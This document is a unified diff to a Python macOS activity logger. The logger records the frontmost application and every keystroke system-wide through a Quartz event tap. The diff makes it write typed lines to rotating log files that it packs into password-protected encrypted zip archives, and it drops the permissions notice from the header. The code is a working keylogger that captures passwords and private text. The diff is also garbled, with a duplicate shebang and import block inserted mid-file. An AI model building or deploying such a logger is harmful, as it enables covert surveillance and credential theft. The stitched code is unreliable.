@@ -1,25 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-macOS Activity‑Logger  (App‑switch + Keystroke buffer)
------------------------------------------------------
-• Before running, grant *Terminal* (or the Python interpreter you use)
-  both “Accessibility” **and** “Input Monitoring” permissions in
-  *Settings › Privacy & Security*.
-• Press **Ctrl‑C** in the terminal window to stop the logger safely.
-
-What you get on stdout
----------------------
-🗂️  APP  Google Chrome        # ← whenever the front‑most app changes
-TXT  Hello world               # ← whole lines, flushed on   ↩︎  (Return)
-
-Special keys handled
---------------------
-Return  … flushes current buffer and prints it
-Delete  … deletes last character in buffer
-Other   … appended to buffer as received (Unicode)
-"""
-
+from __future__ import annotations
 import ctypes
 import datetime as _dt
 import signal
@@ -53,24 +34,99 @@ from Quartz import (
 
 # --- Application‑switch observer ------------------------------------------------
 
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import ctypes as _ctypes            # Quartz の前に import 必須
+import datetime as dt
+import os
+import signal
+import sys
+import time
+from pathlib import Path
+from typing import IO, List, Optional
+
+import objc
+import pyminizip                    # AES-256 encrypted zip
+from Cocoa import (
+    NSObject,
+    NSWorkspace,
+    NSWorkspaceDidActivateApplicationNotification,
+)
+from Quartz import *                # noqa: F403 – PyObjC の惯例
+
+# ─────────────────────────  ローテーション設定  ───────────────────────── #
+
+HOME          = Path.home()
+LOG_DIR       = HOME / "activity_logs"
+LOG_DIR.mkdir(exist_ok=True)
+
+MAX_SIZE      = 1 * 1024 * 1024     # 1 MB
+ROTATE_SPAN   = 24 * 60 * 60        # 1 日（秒）
+ZIP_PASSWORD  = os.getenv("ZIP_PASSWORD")
+
+class RotatingWriter:
+    """サイズ / 経過時間でローテーションし、旧ログを暗号 ZIP 化"""
+
+    def __init__(self, directory: Path):
+        self.dir: Path = directory
+        self.fp: Optional[IO[str]] = None
+        self.created_at: float = 0.0
+        self._open_new()
+
+    # ────────────────────────────────────────────── #
+    def _open_new(self) -> None:
+        ts = dt.datetime.now().strftime("%Y%m%d_%H%M%S")
+        self.curfile: Path = self.dir / f"log_{ts}.txt"
+        self.fp = self.curfile.open("a", encoding="utf-8")
+        self.created_at = time.time()
+
+    def _zip_encrypt(self, file_: Path) -> None:
+        zip_path = str(file_.with_suffix(".zip"))
+        pyminizip.compress(
+            str(file_),
+            None,
+            zip_path,
+            ZIP_PASSWORD,
+            5,          # 圧縮レベル 1–9
+        )
+        file_.unlink(missing_ok=True)
+
+    def _rotate_if_needed(self) -> None:
+        assert self.fp
+        if (self.fp.tell() >= MAX_SIZE) or (time.time() - self.created_at >= ROTATE_SPAN):
+            self.fp.close()
+            self._zip_encrypt(self.curfile)
+            self._open_new()
+
+    # ────────────────────────────────────────────── #
+    def write(self, line: str, also_print: bool = True) -> None:
+        if also_print:
+            print(line)
+        assert self.fp
+        self.fp.write(line + "\n")
+        self.fp.flush()
+        self._rotate_if_needed()
+
+    def close(self) -> None:
+        if self.fp:
+            self.fp.close()
+            self._zip_encrypt(self.curfile)
+
+writer = RotatingWriter(LOG_DIR)
+
+# ──────────────────────  アプリ切り替えオブザーバ  ────────────────────── #
+
 class AppObserver(NSObject):
-    """Posts a message whenever the active application changes."""
+    _current = None  # type: str | None
 
-    def init(self):
-        self = objc.super(AppObserver, self).init()
-        if self is None:
-            return None
-        self._current = None  # type: str | None
-        return self
-
-    # selector has a single colon → one explicit arg (notification)
-    def didActivateApp_(self, notification):  # noqa: N802 (PyObjC naming conv.)
+    def didActivateApp_(self, notification):  # noqa: N802
         app = notification.userInfo()["NSWorkspaceApplicationKey"].localizedName()
         if app != self._current:
             self._current = app
-            stamp = _dt.datetime.now().strftime("%H:%M:%S")
-            flush_buffer()  # flush any partial line before app switch
-            print(f"\n🗂️  APP  {app}  ({stamp})")
+            stamp = dt.datetime.now().strftime("%H:%M:%S")
+            flush_buffer()
+            writer.write(f"\n🗂️  APP  {app}  ({stamp})")
 
     def start(self):
         nc = NSWorkspace.sharedWorkspace().notificationCenter()
@@ -81,36 +137,26 @@ class AppObserver(NSObject):
             None,
         )
 
+# ────────────────────────  キー入力イベントタップ  ─────────────────────── #
 
-# --- Keystroke tap --------------------------------------------------------------
-
-# Mask: listen for KeyDown + FlagsChanged (⇧ / ⌥…) events
-_MASK = (1 << kCGEventKeyDown) | (1 << kCGEventFlagsChanged)
-
-# a mutable buffer we will fill with characters until a Return key is hit
+MASK = (1 << kCGEventKeyDown) | (1 << kCGEventFlagsChanged)
 _buffer: List[str] = []
 
-
 def flush_buffer() -> None:
-    """Print the current buffer as one line and clear it."""
     if _buffer:
-        text = "".join(_buffer)
-        print(f"TXT  {text}")
+        writer.write(f"TXT  {''.join(_buffer)}")
         _buffer.clear()
 
-
-def keyboard_cb(proxy, etype, event, refcon):  # noqa: ANN001 (Quartz API sig.)
+def keyboard_cb(proxy, etype, event, refcon):  # noqa: ANN001
     if etype != kCGEventKeyDown:
-        return event  # Ignore other types (FlagsChanged etc.)
+        return event
 
-    # Get a *single* Unicode string representing the key press
     _, text = CGEventKeyboardGetUnicodeString(event, 255, None, None)
     keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode)
 
-    # Handle special keys ------------------------------------------------------
-    if keycode in (36, 76):  # Return / Enter
+    if keycode in (36, 76):               # Return / Enter
         flush_buffer()
-    elif keycode == 51:  # Delete / Backspace
+    elif keycode == 51:                   # Delete / Backspace
         if _buffer:
             _buffer.pop()
     else:
@@ -118,47 +164,38 @@ def keyboard_cb(proxy, etype, event, refcon):  # noqa: ANN001 (Quartz API sig.)
             _buffer.append(text)
     return event
 
+# ───────────────────────────────  メイン  ─────────────────────────────── #
 
-# --- Main ----------------------------------------------------------------------
-
-def main() -> None:  # noqa: D401 – imperative mood
-    # 1. Create and enable the event tap
+def main() -> None:
     tap = CGEventTapCreate(
         kCGSessionEventTap,
         kCGHeadInsertEventTap,
         kCGEventTapOptionDefault,
-        _MASK,
+        MASK,
         keyboard_cb,
         None,
     )
     if tap is None:
-        sys.exit(
-            "❌  CGEventTapCreate failed. Check Accessibility / Input‑Monitoring permissions."
-        )
+        sys.exit("❌  CGEventTapCreate failed – check permissions.")
 
     src = CFMachPortCreateRunLoopSource(None, tap, 0)
     CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes)
     CGEventTapEnable(tap, True)
 
-    # 2. Start application‑switch observer
     observer = AppObserver.alloc().init()
     observer.start()
 
-    # 3. Stop handler (Ctrl‑C)
-    def _stop(sig, frame):  # noqa: D401, ANN001 – signal handler sig, frame
-        print("\n⏹  Stopping …")
+    def _stop(sig, frame):  # noqa: ANN001
+        writer.write("\n⏹  Stopping …", also_print=True)
         flush_buffer()
+        writer.close()
         CGEventTapEnable(tap, False)
         CFRunLoopStop(CFRunLoopGetCurrent())
 
     signal.signal(signal.SIGINT, _stop)
 
-    print("🟢  Start logging …  (Ctrl‑C to quit)")
+    writer.write("🟢  Start logging …  (Ctrl-C to quit)")
     CFRunLoopRun()
 
-
 if __name__ == "__main__":
-    # Quartz type marshaling relies on ctypes – make sure it's imported *before* main
-    import ctypes as _ctypes  # noqa: F401  (kept for clarity)
-
     main()
